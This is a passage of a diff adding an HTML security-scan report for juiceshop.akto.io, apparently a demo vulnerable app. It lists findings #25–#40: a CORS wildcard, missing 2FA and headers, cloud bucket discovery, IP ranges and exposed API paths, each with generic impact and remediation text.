+          <span class="detail-value"><span class="module-tag">CORS</span></span>
+        </div>
+
+        <!-- Clickable Technical Details -->
+        <div style="margin-top: 15px;">
+          
+          
+
+          
+          <details class="report-details" style="margin-bottom: 10px; cursor: pointer;">
+            <summary style="font-weight: bold; color: var(--accent);">📄 View Evidence / Response</summary>
+            <div style="padding: 10px; background: rgba(0,0,0,0.2); border-left: 3px solid var(--high); margin-top: 8px;">
+              <div class="code-block">ACAO: *</div>
+            </div>
+          </details>
+          
+
+          <details class="report-details" open style="margin-bottom: 10px; cursor: pointer;">
+            <summary style="font-weight: bold; color: var(--high);">⚠️ Senior Pentester Analysis (Impact)</summary>
+            <div style="padding: 10px; background: rgba(255,140,0,0.1); border-left: 3px solid var(--high); margin-top: 8px; color: #ffaa44;">
+              Could aid attackers in reconnaissance or be chained with other vulnerabilities to compromise the application.
+            </div>
+          </details>
+
+          <details class="report-details" open style="cursor: pointer;">
+            <summary style="font-weight: bold; color: var(--low);">✅ Strategic Remediation</summary>
+            <div class="remediation-box" style="margin-top: 8px;">
+              Restrict ACAO to a specific trusted origin. Never use wildcard when credentials are involved.
+            </div>
+          </details>
+          
+        </div>
+      </div>
+    </div>
+    
+    <div class="finding-card">
+      <div class="finding-header">
+        <div>
+          <span class="badge badge-medium" style="margin-right:10px;">MEDIUM</span>
+          <span class="finding-title">2FA — Not Implemented</span>
+        </div>
+        <span style="font-size:12px; color:var(--muted);">#25 | CVSS 5.9</span>
+      </div>
+      <div class="finding-body">
+        <div class="detail-grid">
+          <span class="detail-label">Location</span>
+          <span class="detail-value">
+            <div class="code-block">https://juiceshop.akto.io</div>
+          </span>
+
+          <span class="detail-label">Description</span>
+          <span class="detail-value">No 2FA/MFA endpoint detected.</span>
+
+          <span class="detail-label">OWASP</span>
+          <span class="detail-value" style="color:var(--accent);">A07:2021 – Identification and Authentication Failures</span>
+
+          <span class="detail-label">Module</span>
+          <span class="detail-value"><span class="module-tag">2FA</span></span>
+        </div>
+
+        <!-- Clickable Technical Details -->
+        <div style="margin-top: 15px;">
+          
+          
+
+          
+          <details class="report-details" style="margin-bottom: 10px; cursor: pointer;">
+            <summary style="font-weight: bold; color: var(--accent);">📄 View Evidence / Response</summary>
+            <div style="padding: 10px; background: rgba(0,0,0,0.2); border-left: 3px solid var(--high); margin-top: 8px;">
+              <div class="code-block">None of common OTP paths returned OTP form.</div>
+            </div>
+          </details>
+          
+
+          <details class="report-details" open style="margin-bottom: 10px; cursor: pointer;">
+            <summary style="font-weight: bold; color: var(--high);">⚠️ Senior Pentester Analysis (Impact)</summary>
+            <div style="padding: 10px; background: rgba(255,140,0,0.1); border-left: 3px solid var(--high); margin-top: 8px; color: #ffaa44;">
+              Could aid attackers in reconnaissance or be chained with other vulnerabilities to compromise the application.
+            </div>
+          </details>
+
+          <details class="report-details" open style="cursor: pointer;">
+            <summary style="font-weight: bold; color: var(--low);">✅ Strategic Remediation</summary>
+            <div class="remediation-box" style="margin-top: 8px;">
+              Implement TOTP-based 2FA (FIDO2/WebAuthn/RFC 6238) for all accounts.
+            </div>
+          </details>
+          
+        </div>
+      </div>
+    </div>
+    
+    <div class="finding-card">
+      <div class="finding-header">
+        <div>
+          <span class="badge badge-low" style="margin-right:10px;">LOW</span>
+          <span class="finding-title">Missing Header: Referrer-Policy</span>
+        </div>
+        <span style="font-size:12px; color:var(--muted);">#26 | CVSS 3.1</span>
+      </div>
+      <div class="finding-body">
+        <div class="detail-grid">
+          <span class="detail-label">Location</span>
+          <span class="detail-value">
+            <div class="code-block">https://juiceshop.akto.io</div>
+          </span>
+
+          <span class="detail-label">Description</span>
+          <span class="detail-value">Missing Referrer-Policy may leak sensitive URL information to third parties.</span>
+
+          <span class="detail-label">OWASP</span>
+          <span class="detail-value" style="color:var(--accent);">A05:2021 – Security Misconfiguration</span>
+
+          <span class="detail-label">Module</span>
+          <span class="detail-value"><span class="module-tag">Header Check</span></span>
+        </div>
+
+        <!-- Clickable Technical Details -->
+        <div style="margin-top: 15px;">
+          
+          
+
+          
+          <details class="report-details" style="margin-bottom: 10px; cursor: pointer;">
+            <summary style="font-weight: bold; color: var(--accent);">📄 View Evidence / Response</summary>
+            <div style="padding: 10px; background: rgba(0,0,0,0.2); border-left: 3px solid var(--high); margin-top: 8px;">
+              <div class="code-block">Header &#39;Referrer-Policy&#39; not present in response</div>
+            </div>
+          </details>
+          
+
+          <details class="report-details" open style="margin-bottom: 10px; cursor: pointer;">
+            <summary style="font-weight: bold; color: var(--high);">⚠️ Senior Pentester Analysis (Impact)</summary>
+            <div style="padding: 10px; background: rgba(255,140,0,0.1); border-left: 3px solid var(--high); margin-top: 8px; color: #ffaa44;">
+              Missing security headers expose users to MIME-sniffing, Clickjacking, and Cross-Site Scripting. It weakens the client-side security posture significantly.
+            </div>
+          </details>
+
+          <details class="report-details" open style="cursor: pointer;">
+            <summary style="font-weight: bold; color: var(--low);">✅ Strategic Remediation</summary>
+            <div class="remediation-box" style="margin-top: 8px;">
+              Configure the web server to emit standard security headers: Content-Security-Policy (CSP), X-Frame-Options, X-Content-Type-Options: nosniff, and Strict-Transport-Security (HSTS).
+            </div>
+          </details>
+          
+        </div>
+      </div>
+    </div>
+    
+    <div class="finding-card">
+      <div class="finding-header">
+        <div>
+          <span class="badge badge-info" style="margin-right:10px;">INFO</span>
+          <span class="finding-title">Technology Fingerprinting</span>
+        </div>
+        <span style="font-size:12px; color:var(--muted);">#27 | CVSS 0.0</span>
+      </div>
+      <div class="finding-body">
+        <div class="detail-grid">
+          <span class="detail-label">Location</span>
+          <span class="detail-value">
+            <div class="code-block">https://juiceshop.akto.io/</div>
+          </span>
+
+          <span class="detail-label">Description</span>
+          <span class="detail-value">Technology detected: Not disclosed</span>
+
+          <span class="detail-label">OWASP</span>
+          <span class="detail-value" style="color:var(--accent);">A05:2021 – Security Misconfiguration</span>
+
+          <span class="detail-label">Module</span>
+          <span class="detail-value"><span class="module-tag">Technology Fingerprinting</span></span>
+        </div>
+
+        <!-- Clickable Technical Details -->
+        <div style="margin-top: 15px;">
+          
+          
+
+          
+
+          <details class="report-details" open style="margin-bottom: 10px; cursor: pointer;">
+            <summary style="font-weight: bold; color: var(--high);">⚠️ Senior Pentester Analysis (Impact)</summary>
+            <div style="padding: 10px; background: rgba(255,140,0,0.1); border-left: 3px solid var(--high); margin-top: 8px; color: #ffaa44;">
+              Could aid attackers in reconnaissance or be chained with other vulnerabilities to compromise the application.
+            </div>
+          </details>
+
+          <details class="report-details" open style="cursor: pointer;">
+            <summary style="font-weight: bold; color: var(--low);">✅ Strategic Remediation</summary>
+            <div class="remediation-box" style="margin-top: 8px;">
+              Follow security best practices and ensure all inputs are sanitized and dependencies updated.
+            </div>
+          </details>
+          
+        </div>
+      </div>
+    </div>
+    
+    <div class="finding-card">
+      <div class="finding-header">
+        <div>
+          <span class="badge badge-info" style="margin-right:10px;">INFO</span>
+          <span class="finding-title">Web Crawler</span>
+        </div>
+        <span style="font-size:12px; color:var(--muted);">#28 | CVSS 0.0</span>
+      </div>
+      <div class="finding-body">
+        <div class="detail-grid">
+          <span class="detail-label">Location</span>
+          <span class="detail-value">
+            <div class="code-block">https://juiceshop.akto.io/</div>
+          </span>
+
+          <span class="detail-label">Description</span>
+          <span class="detail-value">-</span>
+
+          <span class="detail-label">OWASP</span>
+          <span class="detail-value" style="color:var(--accent);">A05:2021 – Security Misconfiguration</span>
+
+          <span class="detail-label">Module</span>
+          <span class="detail-value"><span class="module-tag">Web Crawler</span></span>
+        </div>
+
+        <!-- Clickable Technical Details -->
+        <div style="margin-top: 15px;">
+          
+          
+
+          
+
+          <details class="report-details" open style="margin-bottom: 10px; cursor: pointer;">
+            <summary style="font-weight: bold; color: var(--high);">⚠️ Senior Pentester Analysis (Impact)</summary>
+            <div style="padding: 10px; background: rgba(255,140,0,0.1); border-left: 3px solid var(--high); margin-top: 8px; color: #ffaa44;">
+              Could aid attackers in reconnaissance or be chained with other vulnerabilities to compromise the application.
+            </div>
+          </details>
+
+          <details class="report-details" open style="cursor: pointer;">
+            <summary style="font-weight: bold; color: var(--low);">✅ Strategic Remediation</summary>
+            <div class="remediation-box" style="margin-top: 8px;">
+              Follow security best practices and ensure all inputs are sanitized and dependencies updated.
+            </div>
+          </details>
+          
+        </div>
+      </div>
+    </div>
+    
+    <div class="finding-card">
+      <div class="finding-header">
+        <div>
+          <span class="badge badge-info" style="margin-right:10px;">INFO</span>
+          <span class="finding-title">AWS S3</span>
+        </div>
+        <span style="font-size:12px; color:var(--muted);">#29 | CVSS 0.0</span>
+      </div>
+      <div class="finding-body">
+        <div class="detail-grid">
+          <span class="detail-label">Location</span>
+          <span class="detail-value">
+            <div class="code-block">http://juiceshop-staging.s3.amazonaws.com</div>
+          </span>
+
+          <span class="detail-label">Description</span>
+          <span class="detail-value">AWS S3 status: Exists (Access Denied) — http://juiceshop-staging.s3.amazonaws.com</span>
+
+          <span class="detail-label">OWASP</span>
+          <span class="detail-value" style="color:var(--accent);">A05:2021 – Security Misconfiguration</span>
+
+          <span class="detail-label">Module</span>
+          <span class="detail-value"><span class="module-tag">AWS</span></span>
+        </div>
+
+        <!-- Clickable Technical Details -->
+        <div style="margin-top: 15px;">
+          
+          
+
+          
+
+          <details class="report-details" open style="margin-bottom: 10px; cursor: pointer;">
+            <summary style="font-weight: bold; color: var(--high);">⚠️ Senior Pentester Analysis (Impact)</summary>
+            <div style="padding: 10px; background: rgba(255,140,0,0.1); border-left: 3px solid var(--high); margin-top: 8px; color: #ffaa44;">
+              Could aid attackers in reconnaissance or be chained with other vulnerabilities to compromise the application.
+            </div>
+          </details>
+
+          <details class="report-details" open style="cursor: pointer;">
+            <summary style="font-weight: bold; color: var(--low);">✅ Strategic Remediation</summary>
+            <div class="remediation-box" style="margin-top: 8px;">
+              Follow security best practices and ensure all inputs are sanitized and dependencies updated.
+            </div>
+          </details>
+          
+        </div>
+      </div>
+    </div>
+    
+    <div class="finding-card">
+      <div class="finding-header">
+        <div>
+          <span class="badge badge-info" style="margin-right:10px;">INFO</span>
+          <span class="finding-title">AWS S3</span>
+        </div>
+        <span style="font-size:12px; color:var(--muted);">#30 | CVSS 0.0</span>
+      </div>
+      <div class="finding-body">
+        <div class="detail-grid">
+          <span class="detail-label">Location</span>
+          <span class="detail-value">
+            <div class="code-block">http://juiceshop.s3.amazonaws.com</div>
+          </span>
+
+          <span class="detail-label">Description</span>
+          <span class="detail-value">AWS S3 status: Exists (Access Denied) — http://juiceshop.s3.amazonaws.com</span>
+
+          <span class="detail-label">OWASP</span>
+          <span class="detail-value" style="color:var(--accent);">A05:2021 – Security Misconfiguration</span>
+
+          <span class="detail-label">Module</span>
+          <span class="detail-value"><span class="module-tag">AWS</span></span>
+        </div>
+
+        <!-- Clickable Technical Details -->
+        <div style="margin-top: 15px;">
+          
+          
+
+          
+
+          <details class="report-details" open style="margin-bottom: 10px; cursor: pointer;">
+            <summary style="font-weight: bold; color: var(--high);">⚠️ Senior Pentester Analysis (Impact)</summary>
+            <div style="padding: 10px; background: rgba(255,140,0,0.1); border-left: 3px solid var(--high); margin-top: 8px; color: #ffaa44;">
+              Could aid attackers in reconnaissance or be chained with other vulnerabilities to compromise the application.
+            </div>
+          </details>
+
+          <details class="report-details" open style="cursor: pointer;">
+            <summary style="font-weight: bold; color: var(--low);">✅ Strategic Remediation</summary>
+            <div class="remediation-box" style="margin-top: 8px;">
+              Follow security best practices and ensure all inputs are sanitized and dependencies updated.
+            </div>
+          </details>
+          
+        </div>
+      </div>
+    </div>
+    
+    <div class="finding-card">
+      <div class="finding-header">
+        <div>
+          <span class="badge badge-info" style="margin-right:10px;">INFO</span>
+          <span class="finding-title">Azure Blob</span>
+        </div>
+        <span style="font-size:12px; color:var(--muted);">#31 | CVSS 0.0</span>
+      </div>
+      <div class="finding-body">
+        <div class="detail-grid">
+          <span class="detail-label">Location</span>
+          <span class="detail-value">
+            <div class="code-block">https://juiceshop.blob.core.windows.net/</div>
+          </span>
+
+          <span class="detail-label">Description</span>
+          <span class="detail-value">Azure Blob status: Exists — https://juiceshop.blob.core.windows.net/</span>
+
+          <span class="detail-label">OWASP</span>
+          <span class="detail-value" style="color:var(--accent);">A05:2021 – Security Misconfiguration</span>
+
+          <span class="detail-label">Module</span>
+          <span class="detail-value"><span class="module-tag">Azure</span></span>
+        </div>
+
+        <!-- Clickable Technical Details -->
+        <div style="margin-top: 15px;">
+          
+          
+
+          
+
+          <details class="report-details" open style="margin-bottom: 10px; cursor: pointer;">
+            <summary style="font-weight: bold; color: var(--high);">⚠️ Senior Pentester Analysis (Impact)</summary>
+            <div style="padding: 10px; background: rgba(255,140,0,0.1); border-left: 3px solid var(--high); margin-top: 8px; color: #ffaa44;">
+              Could aid attackers in reconnaissance or be chained with other vulnerabilities to compromise the application.
+            </div>
+          </details>
+
+          <details class="report-details" open style="cursor: pointer;">
+            <summary style="font-weight: bold; color: var(--low);">✅ Strategic Remediation</summary>
+            <div class="remediation-box" style="margin-top: 8px;">
+              Follow security best practices and ensure all inputs are sanitized and dependencies updated.
+            </div>
+          </details>
+          
+        </div>
+      </div>
+    </div>
+    
+    <div class="finding-card">
+      <div class="finding-header">
+        <div>
+          <span class="badge badge-info" style="margin-right:10px;">INFO</span>
+          <span class="finding-title">GCP Bucket</span>
+        </div>
+        <span style="font-size:12px; color:var(--muted);">#32 | CVSS 0.0</span>
+      </div>
+      <div class="finding-body">
+        <div class="detail-grid">
+          <span class="detail-label">Location</span>
+          <span class="detail-value">
+            <div class="code-block">https://storage.googleapis.com/juiceshoptest</div>
+          </span>
+
+          <span class="detail-label">Description</span>
+          <span class="detail-value">GCP Bucket status: Exists (Access Denied) — https://storage.googleapis.com/juiceshoptest</span>
+
+          <span class="detail-label">OWASP</span>
+          <span class="detail-value" style="color:var(--accent);">A05:2021 – Security Misconfiguration</span>
+
+          <span class="detail-label">Module</span>
+          <span class="detail-value"><span class="module-tag">GCP</span></span>
+        </div>
+
+        <!-- Clickable Technical Details -->
+        <div style="margin-top: 15px;">
+          
+          
+
+          
+
+          <details class="report-details" open style="margin-bottom: 10px; cursor: pointer;">
+            <summary style="font-weight: bold; color: var(--high);">⚠️ Senior Pentester Analysis (Impact)</summary>
+            <div style="padding: 10px; background: rgba(255,140,0,0.1); border-left: 3px solid var(--high); margin-top: 8px; color: #ffaa44;">
+              Could aid attackers in reconnaissance or be chained with other vulnerabilities to compromise the application.
+            </div>
+          </details>
+
+          <details class="report-details" open style="cursor: pointer;">
+            <summary style="font-weight: bold; color: var(--low);">✅ Strategic Remediation</summary>
+            <div class="remediation-box" style="margin-top: 8px;">
+              Follow security best practices and ensure all inputs are sanitized and dependencies updated.
+            </div>
+          </details>
+          
+        </div>
+      </div>
+    </div>
+    
+    <div class="finding-card">
+      <div class="finding-header">
+        <div>
+          <span class="badge badge-info" style="margin-right:10px;">INFO</span>
+          <span class="finding-title">Infrastructure</span>
+        </div>
+        <span style="font-size:12px; color:var(--muted);">#33 | CVSS 0.0</span>
+      </div>
+      <div class="finding-body">
+        <div class="detail-grid">
+          <span class="detail-label">Location</span>
+          <span class="detail-value">
+            <div class="code-block">https://juiceshop.akto.io/</div>
+          </span>
+
+          <span class="detail-label">Description</span>
+          <span class="detail-value">Company: 13.64.0.0/11</span>
+
+          <span class="detail-label">OWASP</span>
+          <span class="detail-value" style="color:var(--accent);">A05:2021 – Security Misconfiguration</span>
+
+          <span class="detail-label">Module</span>
+          <span class="detail-value"><span class="module-tag">Infrastructure</span></span>
+        </div>
+
+        <!-- Clickable Technical Details -->
+        <div style="margin-top: 15px;">
+          
+          
+
+          
+          <details class="report-details" style="margin-bottom: 10px; cursor: pointer;">
+            <summary style="font-weight: bold; color: var(--accent);">📄 View Evidence / Response</summary>
+            <div style="padding: 10px; background: rgba(0,0,0,0.2); border-left: 3px solid var(--high); margin-top: 8px;">
+              <div class="code-block">ASN: AS8075</div>
+            </div>
+          </details>
+          
+
+          <details class="report-details" open style="margin-bottom: 10px; cursor: pointer;">
+            <summary style="font-weight: bold; color: var(--high);">⚠️ Senior Pentester Analysis (Impact)</summary>
+            <div style="padding: 10px; background: rgba(255,140,0,0.1); border-left: 3px solid var(--high); margin-top: 8px; color: #ffaa44;">
+              Could aid attackers in reconnaissance or be chained with other vulnerabilities to compromise the application.
+            </div>
+          </details>
+
+          <details class="report-details" open style="cursor: pointer;">
+            <summary style="font-weight: bold; color: var(--low);">✅ Strategic Remediation</summary>
+            <div class="remediation-box" style="margin-top: 8px;">
+              Follow security best practices and ensure all inputs are sanitized and dependencies updated.
+            </div>
+          </details>
+          
+        </div>
+      </div>
+    </div>
+    
+    <div class="finding-card">
+      <div class="finding-header">
+        <div>
+          <span class="badge badge-info" style="margin-right:10px;">INFO</span>
+          <span class="finding-title">IP Prefixes</span>
+        </div>
+        <span style="font-size:12px; color:var(--muted);">#34 | CVSS 0.0</span>
+      </div>
+      <div class="finding-body">
+        <div class="detail-grid">
+          <span class="detail-label">Location</span>
+          <span class="detail-value">
+            <div class="code-block">https://juiceshop.akto.io/</div>
+          </span>
+
+          <span class="detail-label">Description</span>
+          <span class="detail-value">208.66.231.0/24, 51.140.0.0/14, 128.24.0.0/16, 199.65.40.0/24, 137.117.0.0/16, 135.130.0.0/16, 204.194.56.0/22, 2001:df0:d8::/48, 134.170.0.0/16, 135.88.0.0/16...</span>
+
+          <span class="detail-label">OWASP</span>
+          <span class="detail-value" style="color:var(--accent);">A05:2021 – Security Misconfiguration</span>
+
+          <span class="detail-label">Module</span>
+          <span class="detail-value"><span class="module-tag">IP</span></span>
+        </div>
+
+        <!-- Clickable Technical Details -->
+        <div style="margin-top: 15px;">
+          
+          
+
+          
+          <details class="report-details" style="margin-bottom: 10px; cursor: pointer;">
+            <summary style="font-weight: bold; color: var(--accent);">📄 View Evidence / Response</summary>
+            <div style="padding: 10px; background: rgba(0,0,0,0.2); border-left: 3px solid var(--high); margin-top: 8px;">
+              <div class="code-block">Found 1101 CIDR blocks</div>
+            </div>
+          </details>
+          
+
+          <details class="report-details" open style="margin-bottom: 10px; cursor: pointer;">
+            <summary style="font-weight: bold; color: var(--high);">⚠️ Senior Pentester Analysis (Impact)</summary>
+            <div style="padding: 10px; background: rgba(255,140,0,0.1); border-left: 3px solid var(--high); margin-top: 8px; color: #ffaa44;">
+              Could aid attackers in reconnaissance or be chained with other vulnerabilities to compromise the application.
+            </div>
+          </details>
+
+          <details class="report-details" open style="cursor: pointer;">
+            <summary style="font-weight: bold; color: var(--low);">✅ Strategic Remediation</summary>
+            <div class="remediation-box" style="margin-top: 8px;">
+              Follow security best practices and ensure all inputs are sanitized and dependencies updated.
+            </div>
+          </details>
+          
+        </div>
+      </div>
+    </div>
+    
+    <div class="finding-card">
+      <div class="finding-header">
+        <div>
+          <span class="badge badge-info" style="margin-right:10px;">INFO</span>
+          <span class="finding-title">Exposed Sensitive Path</span>
+        </div>
+        <span style="font-size:12px; color:var(--muted);">#35 | CVSS 0.0</span>
+      </div>
+      <div class="finding-body">
+        <div class="detail-grid">
+          <span class="detail-label">Location</span>
+          <span class="detail-value">
+            <div class="code-block">https://juiceshop.akto.io/api-docs</div>
+          </span>
+
+          <span class="detail-label">Description</span>
+          <span class="detail-value">Path accessible with HTTP 301</span>
+
+          <span class="detail-label">OWASP</span>
+          <span class="detail-value" style="color:var(--accent);">A05:2021 – Security Misconfiguration</span>
+
+          <span class="detail-label">Module</span>
+          <span class="detail-value"><span class="module-tag">Exposed</span></span>
+        </div>
+
+        <!-- Clickable Technical Details -->
+        <div style="margin-top: 15px;">
+          
+          
+
+          
+          <details class="report-details" style="margin-bottom: 10px; cursor: pointer;">
+            <summary style="font-weight: bold; color: var(--accent);">📄 View Evidence / Response</summary>
+            <div style="padding: 10px; background: rgba(0,0,0,0.2); border-left: 3px solid var(--high); margin-top: 8px;">
+              <div class="code-block">HTTP 301 | Size: 158 bytes | No WAF block</div>
+            </div>
+          </details>
+          
+
+          <details class="report-details" open style="margin-bottom: 10px; cursor: pointer;">
+            <summary style="font-weight: bold; color: var(--high);">⚠️ Senior Pentester Analysis (Impact)</summary>
+            <div style="padding: 10px; background: rgba(255,140,0,0.1); border-left: 3px solid var(--high); margin-top: 8px; color: #ffaa44;">
+              Could aid attackers in reconnaissance or be chained with other vulnerabilities to compromise the application.
+            </div>
+          </details>
+
+          <details class="report-details" open style="cursor: pointer;">
+            <summary style="font-weight: bold; color: var(--low);">✅ Strategic Remediation</summary>
+            <div class="remediation-box" style="margin-top: 8px;">
+              Review if this path should be publicly accessible. Add authentication if needed.
+            </div>
+          </details>
+          
+        </div>
+      </div>
+    </div>
+    
+    <div class="finding-card">
+      <div class="finding-header">
+        <div>
+          <span class="badge badge-info" style="margin-right:10px;">INFO</span>
+          <span class="finding-title">Exposed Sensitive Path</span>
+        </div>
+        <span style="font-size:12px; color:var(--muted);">#36 | CVSS 0.0</span>
+      </div>
+      <div class="finding-body">
+        <div class="detail-grid">
+          <span class="detail-label">Location</span>
+          <span class="detail-value">
+            <div class="code-block">https://juiceshop.akto.io/media</div>
+          </span>
+
+          <span class="detail-label">Description</span>
+          <span class="detail-value">Path accessible with HTTP 301</span>
+
+          <span class="detail-label">OWASP</span>
+          <span class="detail-value" style="color:var(--accent);">A05:2021 – Security Misconfiguration</span>
+
+          <span class="detail-label">Module</span>
+          <span class="detail-value"><span class="module-tag">Exposed</span></span>
+        </div>
+
+        <!-- Clickable Technical Details -->
+        <div style="margin-top: 15px;">
+          
+          
+
+          
+          <details class="report-details" style="margin-bottom: 10px; cursor: pointer;">
+            <summary style="font-weight: bold; color: var(--accent);">📄 View Evidence / Response</summary>
+            <div style="padding: 10px; background: rgba(0,0,0,0.2); border-left: 3px solid var(--high); margin-top: 8px;">
+              <div class="code-block">HTTP 301 | Size: 155 bytes | No WAF block</div>
+            </div>
+          </details>
+          
+
+          <details class="report-details" open style="margin-bottom: 10px; cursor: pointer;">
+            <summary style="font-weight: bold; color: var(--high);">⚠️ Senior Pentester Analysis (Impact)</summary>
+            <div style="padding: 10px; background: rgba(255,140,0,0.1); border-left: 3px solid var(--high); margin-top: 8px; color: #ffaa44;">
+              Could aid attackers in reconnaissance or be chained with other vulnerabilities to compromise the application.
+            </div>
+          </details>
+
+          <details class="report-details" open style="cursor: pointer;">
+            <summary style="font-weight: bold; color: var(--low);">✅ Strategic Remediation</summary>
+            <div class="remediation-box" style="margin-top: 8px;">
+              Review if this path should be publicly accessible. Add authentication if needed.
+            </div>
+          </details>
+          
+        </div>
+      </div>
+    </div>
+    
+    <div class="finding-card">
+      <div class="finding-header">
+        <div>
+          <span class="badge badge-info" style="margin-right:10px;">INFO</span>
+          <span class="finding-title">Exposed Sensitive Path</span>
+        </div>
+        <span style="font-size:12px; color:var(--muted);">#37 | CVSS 0.0</span>
+      </div>
+      <div class="finding-body">
+        <div class="detail-grid">
+          <span class="detail-label">Location</span>
+          <span class="detail-value">
+            <div class="code-block">https://juiceshop.akto.io/assets</div>
+          </span>
+
+          <span class="detail-label">Description</span>
+          <span class="detail-value">Path accessible with HTTP 301</span>
+
+          <span class="detail-label">OWASP</span>
+          <span class="detail-value" style="color:var(--accent);">A05:2021 – Security Misconfiguration</span>
+
+          <span class="detail-label">Module</span>
+          <span class="detail-value"><span class="module-tag">Exposed</span></span>
+        </div>
+
+        <!-- Clickable Technical Details -->
+        <div style="margin-top: 15px;">
+          
+          
+
+          
+          <details class="report-details" style="margin-bottom: 10px; cursor: pointer;">
+            <summary style="font-weight: bold; color: var(--accent);">📄 View Evidence / Response</summary>
+            <div style="padding: 10px; background: rgba(0,0,0,0.2); border-left: 3px solid var(--high); margin-top: 8px;">
+              <div class="code-block">HTTP 301 | Size: 156 bytes | No WAF block</div>
+            </div>
+          </details>
+          
+
+          <details class="report-details" open style="margin-bottom: 10px; cursor: pointer;">
+            <summary style="font-weight: bold; color: var(--high);">⚠️ Senior Pentester Analysis (Impact)</summary>
+            <div style="padding: 10px; background: rgba(255,140,0,0.1); border-left: 3px solid var(--high); margin-top: 8px; color: #ffaa44;">
+              Could aid attackers in reconnaissance or be chained with other vulnerabilities to compromise the application.
+            </div>
+          </details>
+
+          <details class="report-details" open style="cursor: pointer;">
+            <summary style="font-weight: bold; color: var(--low);">✅ Strategic Remediation</summary>
+            <div class="remediation-box" style="margin-top: 8px;">
+              Review if this path should be publicly accessible. Add authentication if needed.
+            </div>
+          </details>
+          
+        </div>
+      </div>
+    </div>
+    
+    <div class="finding-card">
+      <div class="finding-header">
+        <div>
+          <span class="badge badge-info" style="margin-right:10px;">INFO</span>
+          <span class="finding-title">Exposed Sensitive Path</span>
+        </div>
+        <span style="font-size:12px; color:var(--muted);">#38 | CVSS 0.0</span>
+      </div>
+      <div class="finding-body">
+        <div class="detail-grid">
+          <span class="detail-label">Location</span>
+          <span class="detail-value">
+            <div class="code-block">https://juiceshop.akto.io/api/</div>
+          </span>
+
+          <span class="detail-label">Description</span>
+          <span class="detail-value">Server error triggered — possible misconfiguration</span>
+
+          <span class="detail-label">OWASP</span>
+          <span class="detail-value" style="color:var(--accent);">A05:2021 – Security Misconfiguration</span>
+
+          <span class="detail-label">Module</span>
+          <span class="detail-value"><span class="module-tag">Exposed</span></span>
+        </div>
+
+        <!-- Clickable Technical Details -->
+        <div style="margin-top: 15px;">
+          
+          
+
+          
+          <details class="report-details" style="margin-bottom: 10px; cursor: pointer;">
+            <summary style="font-weight: bold; color: var(--accent);">📄 View Evidence / Response</summary>
+            <div style="padding: 10px; background: rgba(0,0,0,0.2); border-left: 3px solid var(--high); margin-top: 8px;">
+              <div class="code-block">HTTP 500 | Size: 3013 bytes | No WAF block</div>
+            </div>
+          </details>
+          
+
+          <details class="report-details" open style="margin-bottom: 10px; cursor: pointer;">
+            <summary style="font-weight: bold; color: var(--high);">⚠️ Senior Pentester Analysis (Impact)</summary>
+            <div style="padding: 10px; background: rgba(255,140,0,0.1); border-left: 3px solid var(--high); margin-top: 8px; color: #ffaa44;">
+              Could aid attackers in reconnaissance or be chained with other vulnerabilities to compromise the application.
+            </div>
+          </details>
+
+          <details class="report-details" open style="cursor: pointer;">
+            <summary style="font-weight: bold; color: var(--low);">✅ Strategic Remediation</summary>
+            <div class="remediation-box" style="margin-top: 8px;">
+              Review if this path should be publicly accessible. Add authentication if needed.
+            </div>
+          </details>
+          
+        </div>
+      </div>
+    </div>
+    
+    <div class="finding-card">
+      <div class="finding-header">
+        <div>
+          <span class="badge badge-info" style="margin-right:10px;">INFO</span>
+          <span class="finding-title">Exposed Sensitive Path</span>
+        </div>
+        <span style="font-size:12px; color:var(--muted);">#39 | CVSS 0.0</span>
+      </div>
+      <div class="finding-body">
+        <div class="detail-grid">
+          <span class="detail-label">Location</span>
+          <span class="detail-value">
+            <div class="code-block">https://juiceshop.akto.io/api/v2/</div>
+          </span>
+
+          <span class="detail-label">Description</span>
+          <span class="detail-value">Server error triggered — possible misconfiguration</span>
+
+          <span class="detail-label">OWASP</span>
+          <span class="detail-value" style="color:var(--accent);">A05:2021 – Security Misconfiguration</span>
+
+          <span class="detail-label">Module</span>
+          <span class="detail-value"><span class="module-tag">Exposed</span></span>
+        </div>
+
+        <!-- Clickable Technical Details -->
+        <div style="margin-top: 15px;">
+          
+          
+
+          
+          <details class="report-details" style="margin-bottom: 10px; cursor: pointer;">
+            <summary style="font-weight: bold; color: var(--accent);">📄 View Evidence / Response</summary>
+            <div style="padding: 10px; background: rgba(0,0,0,0.2); border-left: 3px solid var(--high); margin-top: 8px;">
+              <div class="code-block">HTTP 500 | Size: 3019 bytes | No WAF block</div>
+            </div>
+          </details>
+          
+
+          <details class="report-details" open style="margin-bottom: 10px; cursor: pointer;">
+            <summary style="font-weight: bold; color: var(--high);">⚠️ Senior Pentester Analysis (Impact)</summary>
+            <div style="padding: 10px; background: rgba(255,140,0,0.1); border-left: 3px solid var(--high); margin-top: 8px; color: #ffaa44;">
+              Could aid attackers in reconnaissance or be chained with other vulnerabilities to compromise the application.
+            </div>
+          </details>
+
+          <details class="report-details" open style="cursor: pointer;">
+            <summary style="font-weight: bold; color: var(--low);">✅ Strategic Remediation</summary>
+            <div class="remediation-box" style="margin-top: 8px;">
+              Review if this path should be publicly accessible. Add authentication if needed.
+            </div>
+          </details>
+          
+        </div>
+      </div>
+    </div>
+    
+    <div class="finding-card">
+      <div class="finding-header">
+        <div>
+          <span class="badge badge-info" style="margin-right:10px;">INFO</span>
+          <span class="finding-title">Exposed Sensitive Path</span>
+        </div>
+        <span style="font-size:12px; color:var(--muted);">#40 | CVSS 0.0</span>
+      </div>
+      <div class="finding-body">
+        <div class="detail-grid">
+          <span class="detail-label">Location</span>
+          <span class="detail-value">
+            <div class="code-block">https://juiceshop.akto.io/rest</div>
+          </span>
+
+          <span class="detail-label">Description</span>
+          <span class="detail-value">Server error triggered — possible misconfiguration</span>
+
+          <span class="detail-label">OWASP</span>
+          <span class="detail-value" style="color:var(--accent);">A05:2021 – Security Misconfiguration</span>
+
+          <span class="detail-label">Module</span>
+          <span class="detail-value"><span class="module-tag">Exposed</span></span>
+        </div>
+
+        <!-- Clickable Technical Details -->
+        <div style="margin-top: 15px;">
+          
+          
+
+          
+          <details class="report-details" style="margin-bottom: 10px; cursor: pointer;">
+            <summary style="font-weight: bold; color: var(--accent);">📄 View Evidence / Response</summary>
+            <div style="padding: 10px; background: rgba(0,0,0,0.2); border-left: 3px solid var(--high); margin-top: 8px;">
+              <div class="code-block">HTTP 500 | Size: 3013 bytes | No WAF block</div>
+            </div>
+          </details>
+          
+
+          <details class="report-details" open style="margin-bottom: 10px; cursor: pointer;">
+            <summary style="font-weight: bold; color: var(--high);">⚠️ Senior Pentester Analysis (Impact)</summary>
